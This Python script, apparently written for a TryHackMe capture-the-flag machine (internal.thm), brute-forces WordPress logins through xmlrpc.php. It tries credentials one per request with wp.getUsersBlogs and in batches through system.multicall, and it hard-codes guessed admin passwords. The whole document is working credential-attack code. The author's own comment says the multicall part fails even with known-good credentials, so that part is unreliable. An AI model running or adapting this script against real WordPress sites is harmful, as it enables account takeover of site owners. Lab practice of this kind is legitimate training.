#!/usr/bin/env python
import requests;
import xmltodict;
import xml.etree.cElementTree as ET;

# The multicall returns invalid, even when tested with a known, good username and password,
# which is successful with the single call.

url = "http://internal.thm/blog/xmlrpc.php";

data = """<?xml version="1.0" encoding="utf-8"?> 
	<methodCall> 
	<methodName>{0}</methodName> 
	<params>{1}</params> 
	</methodCall>""";

multicall_outer_data = """<?xml version="1.0"?>
	<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{0}
	</data></array></value></param></params></methodCall>""";

multicall_inner_data = """<value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value>
                    <string>{0}</string>
                  </value>
                </member>
                <member>
                  <name>params</name>
                  {1}
                </member>
              </struct>
            </value>""";

multicall_userpass_param = """<value>
                    <array>
                      <data>
                        <value>
                          <array>
                            <data>
                              <value>
                                <string>{0}</string>
                              </value>
                              <value>
                                <string>{1}</string>
                              </value>
                            </data>
                          </array>
                        </value>
                      </data>
                    </array>
                  </value>""";            


def get_methods():
	return requests.post(url, data = data.format("system.listMethods", ""));

def say_hello():
	return requests.post(url, data = data.format("demo.sayHello", ""));

def bruteforce_one(username, password):
  payload = data.format("wp.getUsersBlogs", "<param><value>{0}</value></param><param><value>{1}</value></param>".format(username, password));
  result = requests.post(url, data = payload);
  root = ET.fromstring(result.text);
  return (root[0].tag != "fault");

def generate_multicall_param(method, username, password):
  return multicall_inner_data.format(method, multicall_userpass_param.format(username, password));

def parse_login_attempt(value):
  struct = value[0];
  member = struct[0];
  name = member[0];
  value = member[1];
  return (name.text != "faultCode");

def bruteforce():
  logins_to_test = [
    ["admin", "admin"],
    ["admin", "my2boys"],
    ["admin", "admin3"]
  ];
  
  inner = "";
  for x in range(len(logins_to_test)):
    inner += generate_multicall_param("wp.getUsersBlogs", logins_to_test[x][0], logins_to_test[x][1]);
  
  outer = multicall_outer_data.format(inner);
  result = requests.post(url, data = outer);
  root = ET.fromstring(result.text);
  data = root[0][0][0][0][0];

  for x in range(len(logins_to_test)):
    if(parse_login_attempt(data[x])):
      print("Success: {0} : {1}".format(logins_to_test[x][0], logins_to_test[x][1]));
      return True;
  return False;

print(bruteforce());
print(bruteforce_one("admin", "password"));
print(bruteforce_one("admin", "my2boys"));